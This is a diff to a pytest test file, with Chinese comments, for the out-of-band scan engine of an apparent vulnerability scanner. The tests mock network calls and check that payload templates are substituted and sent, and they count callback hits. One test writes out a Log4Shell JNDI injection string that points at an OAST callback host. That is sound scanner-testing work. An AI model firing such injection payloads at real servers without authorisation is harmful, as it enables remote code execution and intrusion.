@@ -15,6 +15,20 @@ import vulnclaw.engines.framework_zero_day_engines as fwk
 from vulnclaw.core.oob_channel import OOBInteraction
 
 
+# 记录 build_attack_url / async_get 实参，供注入循环与入参断言使用
+_BUILD_CALLS = []
+_GET_CALLS = []
+
+
+def _build_recorder(*a, **k):
+    _BUILD_CALLS.append(a)
+    return "atk://x"
+
+
+async def _get_recorder(*a, **k):
+    _GET_CALLS.append((a, k))
+
+
 # ============================================================
 # mock 工具
 # ============================================================
@@ -48,20 +62,22 @@ def _install_mocks(monkeypatch, channel):
     OOBChannel 是 _run_oob_scan 函数内 `from ... import`，需 patch 源模块；
     build_attack_url/async_get/enrich_finding 是模块级 import，patch fwk 即可。
     """
-    async def _fake_get(*a, **k):
-        pass
     monkeypatch.setattr("vulnclaw.core.oob_channel.OOBChannel",
                         lambda *a, **k: channel)
-    monkeypatch.setattr(fwk, "build_attack_url", lambda *a, **k: "http://t/?q=x")
-    monkeypatch.setattr(fwk, "async_get", _fake_get)
+    monkeypatch.setattr(fwk, "build_attack_url", _build_recorder)
+    monkeypatch.setattr(fwk, "async_get", _get_recorder)
     monkeypatch.setattr(fwk, "enrich_finding", lambda d: d)
 
 
 @pytest_asyncio.fixture(autouse=True)
 async def _clean_dedup():
     fwk._OOB_ATTEMPTED.clear()
+    _BUILD_CALLS.clear()
+    _GET_CALLS.clear()
     yield
     fwk._OOB_ATTEMPTED.clear()
+    _BUILD_CALLS.clear()
+    _GET_CALLS.clear()
 
 
 def _hit(token="tok1", ts="2026-09-01 10:00:00"):
@@ -71,15 +87,16 @@ def _hit(token="tok1", ts="2026-09-01 10:00:00"):
     )
 
 
-async def _run(monkeypatch, channel, engine_name="Log4Shell"):
+async def _run(monkeypatch, channel, engine_name="Log4Shell",
+               payload_templates=None, session=None):
     _install_mocks(monkeypatch, channel)
     return await fwk._run_oob_scan(
         engine_name=engine_name,
         url="https://target.example/app",
         param="p",
         parsed_query="p=x",
-        session=None,
-        payload_templates=[],       # 跳过注入循环与 sleep
+        session=session,
+        payload_templates=payload_templates if payload_templates is not None else [],
         type_label="Log4Shell",
         evidence_note="log4shell 测试",
         recommendation="升级依赖",
@@ -172,3 +189,46 @@ async def test_distinct_target_not_deduped(monkeypatch):
 
     assert await run_unique_target("Struts2", "https://a.example/x") is not None
     assert await run_unique_target("Struts2", "https://b.example/y") is not None
+
+
+# ============================================================
+# 4. 真实注入循环：载荷替换 + 发布参数
+# ============================================================
+@pytest.mark.asyncio
+async def test_payload_templates_substituted_and_fired(monkeypatch):
+    ch = _FakeOOBChannel(hits=[_hit()])
+    sess = object()
+    res = await _run(
+        monkeypatch, ch, session=sess,
+        payload_templates=[
+            "${jndi:ldap://{OBS_HTTP}/a}",
+            "$x:{OBS_DNS}$",
+        ],
+    )
+    assert res is not None
+
+    # 真实注入循环跑过：每个模板都经 build_attack_url
+    assert len(_BUILD_CALLS) == 2
+    p0 = _BUILD_CALLS[0][2]          # build_attack_url(url, param, payload, pq)
+    p1 = _BUILD_CALLS[1][2]
+    assert "https://tok1.oast.pro/" in p0     # {OBS_HTTP} -> probe['url']
+    assert "tok1.oast.pro" in p1              # {OBS_DNS} -> token.domain
+
+    # async_get 收到真实注入 URL 与调用方 session
+    assert len(_GET_CALLS) == 2
+    args, kw = _GET_CALLS[0]
+    assert args[0] == "atk://x"
+    assert kw["session"] is sess
+    assert kw["no_retry"] is True
+
+
+# ============================================================
+# 5. 多命中：callback_count 精确计数
+# ============================================================
+@pytest.mark.asyncio
+async def test_multiple_hits_callback_count(monkeypatch):
+    ch = _FakeOOBChannel(hits=[_hit(ts="t1"), _hit(ts="t2")])
+    res = await _run(monkeypatch, ch)
+    assert res is not None
+    assert res["oob_evidence"]["callback_count"] == 2
+    assert "条数=2" in res["evidence"]
